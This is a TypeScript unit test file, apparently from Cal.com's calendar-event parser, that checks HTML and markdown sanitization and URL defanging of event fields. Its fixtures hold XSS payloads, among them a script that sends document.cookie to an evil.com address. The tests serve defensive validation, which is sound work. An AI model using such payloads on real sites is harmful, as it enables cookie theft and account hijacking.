import type { TFunction } from "i18next";
import { describe, expect, it } from "vitest";

import type { CalendarEvent } from "@calcom/types/Calendar";

import { getRichDescription, sanitizeText, getSanitizedCalEvent } from "./CalEventParser";

describe("getRichDescription", () => {
  const t = ((key: string, _args?: Record<string, unknown>) => key) as TFunction;

  const mockCalEvent: CalendarEvent = {
    type: "test",
    title: "Test Event",
    description: "Test description",
    startTime: "2023-01-01T10:00:00Z",
    endTime: "2023-01-01T11:00:00Z",
    organizer: {
      email: "test@example.com",
      name: "Test Organizer",
      timeZone: "America/New_York",
      language: { translate: t, locale: "en" },
    },
    attendees: [
      {
        email: "attendee@example.com",
        name: "Test Attendee",
        timeZone: "America/New_York",
        language: { translate: t, locale: "en" },
      },
    ],
    location: "https://zoom.us/j/123456brahhh",
    additionalNotes: "Some additional notes",
  };

  it("should format description without extra whitespace", () => {
    const description = getRichDescription(mockCalEvent, t);

    console.log("Description:", description);
    console.log(
      "Lines:",
      description.split("\n").map((line) => `"${line}"`)
    );

    // Description should not have more than 2 consecutive newlines
    expect(description).not.toMatch(/\n{3,}/);

    // Each non-empty line should have content
    const lines = description.split("\n").filter((line) => line.trim());
    lines.forEach((line) => {
      expect(line.trim().length).toBeGreaterThan(0);
    });

    // Verify content is present and properly formatted
    expect(description).toContain("what:");
    expect(description).toContain("Test Event");
    expect(description).toContain("where:");
    expect(description).toContain("https://zoom.us/j/123456brahhh");
  });

  it("should include payment info when present", () => {
    const eventWithPayment = {
      ...mockCalEvent,
      paymentInfo: {
        link: "https://payment.test",
      },
    };

    const description = getRichDescription(eventWithPayment, t);
    expect(description).toContain("pay_now:\nhttps://payment.test");
  });

  it("should handle empty optional fields", () => {
    const eventWithoutOptionals = {
      ...mockCalEvent,
      description: "",
      additionalNotes: "",
      location: "",
    };

    const description = getRichDescription(eventWithoutOptionals, t);
    expect(description).not.toContain("description:");
    expect(description).not.toContain("additional_notes:");
    // Should still contain required fields
    expect(description).toContain("what:");
    expect(description).toContain("who:");
  });
});

describe("sanitizeText", () => {
  it("should handle null and undefined inputs", () => {
    expect(sanitizeText(null)).toBe("");
    expect(sanitizeText(undefined)).toBe("");
  });

  it("should handle empty strings", () => {
    expect(sanitizeText("")).toBe("");
    expect(sanitizeText("   ")).toBe("");
  });

  it("should remove HTML tags", () => {
    expect(sanitizeText("<script>alert('xss')</script>")).toBe("");
    expect(sanitizeText("<div>Hello</div>")).toBe("Hello");
    expect(sanitizeText("<p>Test <strong>bold</strong> text</p>")).toBe("Test bold text");
  });

  it("should handle complex HTML injection attempts", () => {
    const maliciousInput = `
      <script>
        document.location = 'http://evil.com/steal.php?cookie=' + document.cookie;
      </script>
      <img src="x" onerror="alert('xss')">
      <iframe src="javascript:alert('xss')"></iframe>
    `;

    const sanitized = sanitizeText(maliciousInput);
    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("<img");
    expect(sanitized).not.toContain("<iframe");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("javascript:");
    // The sanitized content should be empty or contain only safe text
    expect(sanitized.trim()).toBe("");
  });

  it("should break URLs to prevent clickable links", () => {
    expect(sanitizeText("Visit https://example.com for more info")).toBe(
      "Visit hxxp://example[.]com for more info"
    );
    expect(sanitizeText("Check http://test.com")).toBe("Check hxxp://test[.]com");
  });

  it("should trim whitespace", () => {
    expect(sanitizeText("  Hello World  ")).toBe("Hello World");
    expect(sanitizeText("\n\t  Test  \t\n")).toBe("Test");
  });

  it("should handle markdown safely", () => {
    const markdownInput = "**Bold text** and *italic text* and [link](https://example.com)";
    const sanitized = sanitizeText(markdownInput);
    expect(sanitized).not.toContain("**");
    expect(sanitized).not.toContain("*");
    expect(sanitized).not.toContain("[");
    expect(sanitized).not.toContain("]");
    expect(sanitized).not.toContain("(");
    expect(sanitized).not.toContain(")");
  });

  it("should preserve legitimate content", () => {
    const legitimateInput = "This is a normal event description with numbers 123 and symbols @#$%";
    const sanitized = sanitizeText(legitimateInput);
    expect(sanitized).toBe("This is a normal event description with numbers 123 and symbols @#$%");
  });
});

describe("getSanitizedCalEvent", () => {
  const t = ((key: string, _args?: Record<string, unknown>) => key) as TFunction;

  const mockCalEvent: CalendarEvent = {
    type: "test",
    title: "Test Event <script>alert('xss')</script>",
    description: "Test description with <img src=x onerror=alert('xss')>",
    startTime: "2023-01-01T10:00:00Z",
    endTime: "2023-01-01T11:00:00Z",
    organizer: {
      email: "test@example.com",
      name: "Test Organizer <script>alert('xss')</script>",
      timeZone: "America/New_York",
      language: { translate: t, locale: "en" },
    },
    attendees: [
      {
        email: "attendee@example.com",
        name: "Test Attendee <script>alert('xss')</script>",
        timeZone: "America/New_York",
        language: { translate: t, locale: "en" },
      },
    ],
    location: "https://zoom.us/j/123456brahhh",
    additionalNotes: "Some additional notes with <iframe src=javascript:alert('xss')></iframe>",
    cancellationReason: "Cancelled due to <script>alert('xss')</script>",
    rejectionReason: "Rejected because <img src=x onerror=alert('xss')>",
    customInputs: {
      "Custom Field": "Custom value with <script>alert('xss')</script>",
      "Another Field": "Another value with <iframe src=javascript:alert('xss')></iframe>",
    },
    responses: {
      "Response Field": {
        value: "Response value with <script>alert('xss')</script>",
        label: "Response Field",
        isHidden: false,
      },
      "Object Response": {
        value: "Object value with <img src=x onerror=alert('xss')>",
        label: "Object label with <iframe src=javascript:alert('xss')></iframe>",
        isHidden: false,
      },
    } as Record<string, { value: string; label: string; isHidden: boolean }>,
  };

  it("should sanitize all text fields", () => {
    const sanitized = getSanitizedCalEvent(mockCalEvent);

    // Check title sanitization
    expect(sanitized.title).not.toContain("<script>");
    expect(sanitized.title).not.toContain("alert('xss')");
    expect(sanitized.title).toBe("Test Event");

    // Check description sanitization
    expect(sanitized.description).not.toContain("<img");
    expect(sanitized.description).not.toContain("onerror");
    expect(sanitized.description).toBe("Test description with");

    // Check organizer sanitization
    expect(sanitized.organizer.name).not.toContain("<script>");
    expect(sanitized.organizer.name).toBe("Test Organizer");

    // Check attendee sanitization
    expect(sanitized.attendees[0].name).not.toContain("<script>");
    expect(sanitized.attendees[0].name).toBe("Test Attendee");

    // Check additional notes sanitization
    expect(sanitized.additionalNotes).not.toContain("<iframe");
    expect(sanitized.additionalNotes).not.toContain("javascript:");
    expect(sanitized.additionalNotes).toBe("Some additional notes with");

    // Check cancellation reason sanitization
    expect(sanitized.cancellationReason).not.toContain("<script>");
    expect(sanitized.cancellationReason).toBe("Cancelled due to");

    // Check rejection reason sanitization
    expect(sanitized.rejectionReason).not.toContain("<img");
    expect(sanitized.rejectionReason).not.toContain("onerror");
    expect(sanitized.rejectionReason).toBe("Rejected because");
  });

  it("should sanitize custom inputs", () => {
    const sanitized = getSanitizedCalEvent(mockCalEvent);

    expect(sanitized.customInputs?.["Custom Field"]).not.toContain("<script>");
    expect(sanitized.customInputs?.["Custom Field"]).toBe("Custom value with");

    expect(sanitized.customInputs?.["Another Field"]).not.toContain("<iframe");
    expect(sanitized.customInputs?.["Another Field"]).not.toContain("javascript:");
    expect(sanitized.customInputs?.["Another Field"]).toBe("Another value with");
  });

  it("should sanitize responses", () => {
    const sanitized = getSanitizedCalEvent(mockCalEvent);

    const responseField = sanitized.responses?.["Response Field"] as { value: string; label: string };
    expect(responseField.value).not.toContain("<script>");
    expect(responseField.value).toBe("Response value with");

    const objectResponse = sanitized.responses?.["Object Response"] as { value: string; label: string };
    expect(objectResponse.value).not.toContain("<img");
    expect(objectResponse.value).not.toContain("onerror");
    expect(objectResponse.value).toBe("Object value with");

    expect(objectResponse.label).not.toContain("<iframe");
    expect(objectResponse.label).not.toContain("javascript:");
    expect(objectResponse.label).toBe("Object label with");
  });

  it("should break URLs in location", () => {
    const sanitized = getSanitizedCalEvent(mockCalEvent);
    expect(sanitized.location).toBe("hxxp://zoom[.]us/j/123456brahhh");
  });

  it("should preserve non-string fields", () => {
    const sanitized = getSanitizedCalEvent(mockCalEvent);

    // Non-string fields should remain unchanged
    expect(sanitized.startTime).toBe(mockCalEvent.startTime);
    expect(sanitized.endTime).toBe(mockCalEvent.endTime);
    expect(sanitized.type).toBe(mockCalEvent.type);
    expect(sanitized.organizer.timeZone).toBe(mockCalEvent.organizer.timeZone);
    expect(sanitized.attendees[0].timeZone).toBe(mockCalEvent.attendees[0].timeZone);
  });

  it("should handle team members if present", () => {
    const eventWithTeam = {
      ...mockCalEvent,
      team: {
        id: 1,
        name: "Test Team <script>alert('xss')</script>",
        members: [
          {
            id: 1,
            name: "Team Member <script>alert('xss')</script>",
            email: "member@example.com <script>alert('xss')</script>",
            timeZone: "America/New_York",
            language: { translate: t, locale: "en" },
          },
        ],
      },
    } as CalendarEvent;

    const sanitized = getSanitizedCalEvent(eventWithTeam);

    expect(sanitized.team?.name).not.toContain("<script>");
    expect(sanitized.team?.name).toBe("Test Team");

    expect(sanitized.team?.members[0].name).not.toContain("<script>");
    expect(sanitized.team?.members[0].name).toBe("Team Member");

    expect(sanitized.team?.members[0].email).not.toContain("<script>");
    expect(sanitized.team?.members[0].email).toBe("member@example[.]com");
  });

  it("should handle empty or missing fields gracefully", () => {
    const eventWithEmptyFields = {
      ...mockCalEvent,
      description: "",
      additionalNotes: "",
      cancellationReason: "",
      rejectionReason: "",
      customInputs: {},
      responses: {},
    };

    const sanitized = getSanitizedCalEvent(eventWithEmptyFields);

    expect(sanitized.description).toBe("");
    expect(sanitized.additionalNotes).toBe("");
    expect(sanitized.cancellationReason).toBe("");
    expect(sanitized.rejectionReason).toBe("");
    expect(sanitized.customInputs).toEqual({});
    expect(sanitized.responses).toEqual({});
  });
});
